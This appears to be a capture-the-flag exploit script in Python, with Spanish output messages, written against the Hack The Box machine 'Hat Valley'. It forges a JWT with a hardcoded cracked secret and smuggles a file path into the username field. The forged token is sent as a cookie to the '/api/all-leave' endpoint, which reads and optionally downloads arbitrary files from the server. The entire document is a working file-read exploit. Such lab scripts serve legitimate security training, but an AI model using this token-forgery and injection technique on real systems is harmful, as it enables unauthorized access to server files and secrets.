#!/usr/bin/python3
import jwt, requests, sys

if len(sys.argv) < 2:
   print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <archivo>\n")
   print("[\033[1;34m*\033[1;37m] Para descargar archivos puede usar -d\n")
   exit(1)

file = sys.argv[1]

def generateJWT(file):
    payload = { "username": f"/{file}/", "iat": 1666898953 }
    secret = "123beany123"
    token = jwt.encode(payload, secret)
    return token

token = generateJWT(file)
target = "http://hat-valley.htb/api/all-leave"
cookies = {"token":token}
request = requests.get(target, cookies=cookies)

try:
    if sys.argv[2] == '-d':
        with open(file.split("/")[-1].strip(),'wb') as f:
            f.write(request.content)

except:
    if request.text == "Failed to retrieve leave requests":
        print("\n[\033[1;31m-\033[1;37m] Archivo no encontrado\n")
        exit(1)
    else:
        print(request.text.strip())
